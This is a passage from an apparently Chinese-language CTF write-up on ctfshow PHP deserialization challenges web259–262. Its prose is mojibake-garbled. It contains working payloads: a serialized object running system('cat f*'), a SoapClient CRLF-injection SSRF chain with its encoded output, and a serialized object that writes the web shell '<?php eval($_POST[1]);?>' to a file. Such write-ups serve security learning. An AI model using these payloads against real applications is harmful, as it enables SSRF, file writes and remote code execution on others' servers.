number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web259â€”â€”SoapClientä¸CRLFç»„åˆæ‹³"><a href="#web259â€”â€”SoapClientä¸CRLFç»„åˆæ‹³" class="headerlink" title="web259â€”â€”SoapClientä¸CRLFç»„åˆæ‹³"></a>web259â€”â€”SoapClientä¸CRLFç»„åˆæ‹³</h1><p>è¿™è·¨åº¦æœ‰ç‚¹å¤§</p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104" target="_blank" rel="noopener">ä»ä¸€é“é¢˜å­¦ä¹ SoapClientä¸CRLFç»„åˆæ‹³</a></p><p><a href="https://www.cnblogs.com/studyskill/p/6972576.html" target="_blank" rel="noopener">æ–°æµªæŸç«™CRLF Injectionå¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p><p><a href="https://zhuanlan.zhihu.com/p/80918004" target="_blank" rel="noopener">SoapClientååºåˆ—åŒ–SSRF</a></p><p><strong>phpä¸­çš„å†…ç½®ç±»</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>           <span class="token string">'__destruct'</span><span class="token punctuation">,</span>           <span class="token string">'__toString'</span><span class="token punctuation">,</span>           <span class="token string">'__wakeup'</span><span class="token punctuation">,</span>           <span class="token string">'__call'</span><span class="token punctuation">,</span>           <span class="token string">'__callStatic'</span><span class="token punctuation">,</span>           <span class="token string">'__get'</span><span class="token punctuation">,</span>           <span class="token string">'__set'</span><span class="token punctuation">,</span>           <span class="token string">'__isset'</span><span class="token punctuation">,</span>           <span class="token string">'__unset'</span><span class="token punctuation">,</span>           <span class="token string">'__invoke'</span><span class="token punctuation">,</span>           <span class="token string">'__set_state'</span>       <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯ä¸ªç‰ˆæœ¬å†…ç½®ç±»çš„æ•°é‡æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ‰¾åˆ°SoapClient <code>__call</code>æ–¹æ³•ä½†æ˜¯æŒ‰ç…§é“ç†æ¥è¯´ï¼Œå…¶åº”è¯¥æ˜¯ç¡®å®å­˜åœ¨çš„ï¼</p><p><strong>é¢˜ç›®</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æç¤ºï¼šflag.php</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ˜¯phpä¸æ˜¯pythonæƒ³è¦è¿æ¥web serviceå°±ä¸èƒ½ç®€å•çš„åƒpythonå¯¼å…¥ä¸ªrequestsåŒ…å°±å¯ä»¥äº†ï¼Œåœ¨phpä¸­æ˜¯éœ€è¦åˆ©ç”¨soapclientæ¥è¯·æ±‚çš„ï¼</p><p><a href="https://blog.csdn.net/xin_king/article/details/8720492" target="_blank" rel="noopener">php soapclientçš„ä½¿ç”¨</a></p><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php';</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'yn8rt^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token operator">%</span><span class="token constant">3A10</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22SoapClient<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22uri<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22aaab<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22location<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A25</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22http<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2F</span><span class="token operator">%</span><span class="token constant">2F127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span>2Fflag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22_user_agent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A235</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AContent<span class="token operator">-</span>Type<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">+</span>application<span class="token operator">%</span>2Fx<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">0AX</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">+</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">2C127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AUM_distinctid<span class="token operator">%</span>3A175648cc09a7ae<span class="token operator">-</span>050bc162c95347<span class="token number">-32667006</span><span class="token operator">-</span>13c680<span class="token operator">-</span>175648cc09b69d<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AContent<span class="token operator">-</span>Length<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">+</span><span class="token number">13</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0Atoken<span class="token operator">%</span>3Dctfshow<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A13</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22_soap_version<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bi<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™åˆ°é¢˜ç›®ä¸­<code>$vip = unserialize($_GET[&#39;vip&#39;]);</code>ä¹Ÿå°±å°±æ˜¯<code>$vip = new SoapClient(n...,...)</code>ï¼Œè€Œå½“<code>$vip-&gt;getFlag();</code>æ—¶ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ˜¯ï¼Œä¾¿å°†è°ƒç”¨callé­”æœ¯æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨SoapClientç±»çš„æ„é€ æ–¹æ³•ã€‚</p><p>ç„¶åç›´æ¥ä¼ å‚å°±å¯ä»¥äº†ï¼Œç„¶åè®¿é—®flag.txtå³å¯ï¼Œé¢˜ç›®éå¸¸å¥½</p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">'ctfshow_i_love_36D'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å’Œ <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å½“ååºåˆ—åŒ–æ—¶ä¼šè¿›å…¥<strong>unserializeä¸­ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥è¿›å…¥åˆ°</strong>invokeä¸­ã€‚æ‰€ä»¥ç›´æ¥å°±æœç€å†™æ–‡ä»¶æå°±å¯ä»¥äº†ã€‚</p><pre class="line-numbers language-php"><code class="language-php">åªè¦æ»¡è¶³code<span class="token operator">==</span><span class="token function">0x36d</span><span class="token punctuation">(</span><span class="token number">877</span><span class="token punctuation">)</span>å°±å¯ä»¥äº†ã€‚è€Œcodeæ˜¯usernameå’Œpasswordæ‹¼æ¥å‡ºæ¥çš„ã€‚æ‰€ä»¥åªè¦username<span class="token operator">=</span><span class="token number">877</span><span class="token punctuation">.</span>php password<span class="token operator">=</span>shellå°±å¯ä»¥äº†ã€‚<span class="token number">877</span><span class="token punctuation">.</span>php<span class="token operator">==</span><span class="token number">877</span>æ˜¯æˆç«‹çš„ï¼ˆå¼±ç±»å‹æ¯”è¾ƒï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">'877.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:10:"ctfshowvip":3:{s:8:"username";s:7:"877.php";s:8:"password";s:24:"&lt;?php eval($_POST[1]);?>";s:4:"code";s:0:"";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web262â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web262â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web262â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>web262â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 02:37:19# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token 